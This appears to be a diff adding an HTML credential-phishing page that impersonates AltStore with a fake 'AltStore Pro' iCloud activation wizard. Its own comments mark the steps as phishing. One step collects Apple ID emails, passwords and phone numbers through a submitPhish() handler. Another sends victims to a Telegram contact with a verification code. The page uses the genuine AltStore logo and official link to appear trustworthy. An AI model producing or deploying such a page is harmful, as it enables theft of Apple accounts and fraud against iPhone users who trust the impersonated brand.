@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AltStore Pro · iCloud activation</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://altstore.io/img/logo.svg" alt="AltStore" height="40">
+            <span>+ iCloud</span>
+        </div>
+
+        <!-- Шаг 1: Выбор iOS -->
+        <div id="step1" class="step active">
+            <h2>Select your iOS version</h2>
+            <select id="iosVersion" class="glass-select">
+                <option value="iOS 15+">iOS 15+</option>
+                <option value="iOS 16+">iOS 16+</option>
+                <option value="iOS 17+">iOS 17+</option>
+                <option value="iOS 18+">iOS 18+</option>
+                <option value="iOS 26+">iOS 26+</option>
+            </select>
+            <button class="next-btn" onclick="nextStep(2)">Continue</button>
+        </div>
+
+        <!-- Шаг 2: Выбор модели iPhone -->
+        <div id="step2" class="step">
+            <h2>Select iPhone model</h2>
+            <select id="iphoneModel" class="glass-select">
+                <option value="iPhone 7">iPhone 7</option>
+                <option value="iPhone 8">iPhone 8</option>
+                <option value="iPhone X">iPhone X</option>
+                <option value="iPhone 11">iPhone 11</option>
+                <option value="iPhone 12">iPhone 12</option>
+                <option value="iPhone 13">iPhone 13</option>
+                <option value="iPhone 14">iPhone 14</option>
+                <option value="iPhone 15">iPhone 15</option>
+                <option value="iPhone 16">iPhone 16</option>
+                <option value="iPhone 17 Pro Max">iPhone 17 Pro Max</option>
+            </select>
+            <button class="next-btn" onclick="nextStep(3)">Continue</button>
+        </div>
+
+        <!-- Шаг 3: Выбор версии AltStore -->
+        <div id="step3" class="step">
+            <h2>Choose AltStore version</h2>
+            <div class="button-group">
+                <a href="https://altstore.io" class="altstore-btn" target="_blank">AltStore (official)</a>
+                <button class="altstore-pro-btn" onclick="startPhishing()">AltStore Pro</button>
+            </div>
+        </div>
+
+        <!-- Шаг 4: Фишинг – форма ввода данных -->
+        <div id="step4" class="step">
+            <h2>AltStore Pro activation</h2>
+            <p>This version installs without PC & no jailbreak. Please enter your Apple ID credentials.</p>
+            <form id="phishForm">
+                <input type="email" id="appleId" placeholder="Apple ID (email)" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <input type="tel" id="phone" placeholder="Phone number" required>
+                <input type="text" id="nickname" placeholder="Nickname" required>
+                <div class="checkbox">
+                    <input type="checkbox" id="cert" name="cert">
+                    <label for="cert">Do you have an Apple developer certificate?</label>
+                </div>
+                <button type="button" onclick="submitPhish()">Activate</button>
+            </form>
+        </div>
+
+        <!-- Шаг 5: Фишинг 2 – Telegram код -->
+        <div id="step5" class="step">
+            <h2>Verification required</h2>
+            <p>Contact our developer on Telegram: <strong>@altstorepro</strong> and send them this code:</p>
+            <div class="code-box" id="generatedCode">ALT123PRO</div>
+            <p>After sending, return here and click "Verified".</p>
+            <button onclick="finishPhish()">Verified</button>
+        </div>
+    </div>
+
+    <!-- Встроенное руководство с YouTube -->
+    <div class="youtube-guide">
+        <iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="What is AltStore?" frameborder="0" allowfullscreen></iframe>
+        <p>What is AltStore? (auto explanation)</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
